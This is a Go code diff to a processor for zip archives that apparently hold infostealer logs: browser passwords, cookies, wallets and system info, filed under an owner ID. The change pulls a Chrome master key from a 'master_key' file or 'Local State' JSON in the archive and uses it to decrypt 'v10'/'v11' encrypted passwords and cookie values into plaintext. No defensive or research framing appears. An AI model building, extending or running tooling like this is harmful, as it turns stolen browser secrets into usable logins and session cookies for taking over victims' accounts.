@@ -75,15 +75,21 @@ func detectBrowser(filename string) string {
 	}
 }
 
-func parsePasswordLine(line string) (url, username, password string, ok bool) {
+func parsePasswordLine(line string, masterKey []byte) (url, username, password string, ok bool) {
 	parts := strings.SplitN(line, "\t", 3)
 	if len(parts) < 3 {
 		return "", "", "", false
 	}
-	return parts[0], parts[1], parts[2], true
+	pass := parts[2]
+	if masterKey != nil && len(pass) >= 3 && (pass[:3] == "v10" || pass[:3] == "v11") {
+		if decrypted, err := DecryptChromeValue([]byte(pass), masterKey); err == nil {
+		pass = string(decrypted)
+		}
+	}
+	return parts[0], parts[1], pass, true
 }
 
-func parseCookieLine(line string) (domain, name, value, path string, ok bool) {
+func parseCookieLine(line string, masterKey []byte) (domain, name, value, path string, ok bool) {
 	parts := strings.SplitN(line, "\t", 7)
 	if len(parts) < 7 {
 		return "", "", "", "", false
@@ -92,6 +98,11 @@ func parseCookieLine(line string) (domain, name, value, path string, ok bool) {
 	path = parts[2]
 	name = parts[4]
 	value = parts[5]
+	if masterKey != nil && len(value) >= 3 && (value[:3] == "v10" || value[:3] == "v11") {
+		if decrypted, err := DecryptChromeValue([]byte(value), masterKey); err == nil {
+		value = string(decrypted)
+		}
+	}
 	return domain, name, value, path, true
 }
 
@@ -184,6 +195,7 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 	var wallets []walletEntry
 	var files []fileEntry
 	var systemInfoContent string
+	var masterKey []byte
 
 	for _, f := range zr.File {
 		if !isValidPath(f.Name) {
@@ -204,6 +216,19 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 		}
 
 		switch {
+		case strings.Contains(lower, "master_key") && f.FileInfo().Size() == 32:
+			buf := new(bytes.Buffer)
+			buf.ReadFrom(rc)
+			masterKey = make([]byte, 32)
+			copy(masterKey, buf.Bytes())
+
+		case strings.Contains(lower, "local_state") && strings.HasSuffix(lower, ".json"):
+			buf := new(bytes.Buffer)
+			buf.ReadFrom(rc)
+			if ek, err := ExtractMasterKey(buf.Bytes()); err == nil && ek.Type == KeyTypeRaw {
+				masterKey = ek.Raw
+			}
+
 		case strings.Contains(lower, "passwords") && strings.HasSuffix(lower, ".txt"):
 			buf := new(bytes.Buffer)
 			buf.ReadFrom(rc)
@@ -213,7 +238,7 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 				if line == "" {
 					continue
 				}
-				url, user, pass, ok := parsePasswordLine(line)
+				url, user, pass, ok := parsePasswordLine(line, masterKey)
 				if !ok {
 					continue
 				}
@@ -233,7 +258,7 @@ func (p *LogProcessor) Process(archive []byte, metadataJSON string, ownerID stri
 				if line == "" {
 					continue
 				}
-				domain, name, value, path, ok := parseCookieLine(line)
+				domain, name, value, path, ok := parseCookieLine(line, masterKey)
 				if !ok {
 					continue
 				}
